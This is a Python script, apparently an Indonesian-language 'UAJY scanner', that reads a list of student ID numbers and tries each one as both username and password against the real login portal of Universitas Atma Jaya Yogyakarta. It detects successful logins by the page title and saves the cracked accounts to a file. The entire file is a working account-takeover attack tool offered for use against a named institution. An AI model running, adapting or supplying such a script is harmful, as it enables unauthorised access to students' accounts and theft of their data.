import os
os.system('clear')

try:
	import requests as req
	import requests.packages.urllib3
	from bs4 import BeautifulSoup as Bs
	requests.packages.urllib3.disable_warnings()
except ModuleNotFoundError:
	os.system('python -m pip install --upgrade pip')
	os.system('pip install requests bs4')
	exit('\nSilahkan jalankan ulang Script nya.')

def start(file):
	try:
		# Membuka filepath
		with open(file, 'r') as file:
			hitung  = 0
			failed  = []
			success = []
			barisan = file.readlines()
			for baris in barisan:
				hitung +=1
				
				#untuk Melakukan login dan menampikan output
				ses = req.Session()

				xhost = 'http://login.uajy.ac.id/ac_portal/default/pc.html'
				xdata = { 'username': baris.strip(), 'password': baris.strip() }
				hasil = ses.post(xhost, data=xdata).text
				cek = Bs(hasil, 'html.parser').find('title')
				
				#untuk Menentukan berhasil atau gagal
				if cek.text == 'E-Learning Universitas Atma Jaya Yogyakarta':
					print(f'\033[37m{hitung}) \033[92m{baris.strip()} | {baris.strip()} 》 Login Success')
					success.append(f'{baris.strip()}')
				else:
					print(f'\033[37m{hitung}) \033[31m{baris.strip()} | {baris.strip()} 》 Login Error')
					failed.append(f'{baris.strip()}')
			#Cendol_Dawet
			#untuk Menghitung data akun yg berhasil login
			totalsukses = 0
			for i in success:
				totalsukses +=1
			print(f'\n\033[37m => Sukses: \033[92m{totalsukses}')
			#Root_KandolGanss_04112020
			#untuk Menghitung data akun yg gagal saat login
			totalgagal = 0
			for i in failed:
				totalgagal +=1
			print(f'\033[37m => Gagal: \033[91m{totalgagal}\033[37m\n')
			
			#untuk Menampilkan data akun yg berhasil login
			hitung = 0
			print('Nim Sukses Login:')
			for i in success:
				hitung += 1
				print(f'\033[37m {hitung}) NIM: \033[92m{i} \033[37m| PASSWORD: \033[92m{i}')
				
				#untuk Menyimpan data sukses ke sebuah file
				with open(f'uajy.txt', 'a') as hasil:
					hasil.write(f'{i}\n')
					hasil.close()
			exit("\033[37m\nData tersimpan di \033[96m'uajy.txt'")
		
	except FileNotFoundError:
		exit('\033[91mMaaf, file tidak ditemukan :(')
 

def main():
	print("\033[5;31;40m-----------------------------\n\033[5;33;40m=============================\n\033[5;32;40mU A J Y  S C A N N E R | Kandol\n\033[5;33;40m=============================\n\033[5;31;40m-----------------------------")
	file = input('\033[5;36;40m\nMasukan File Nim 》 ')
	start(file)

if __name__ == '__main__':
	main()
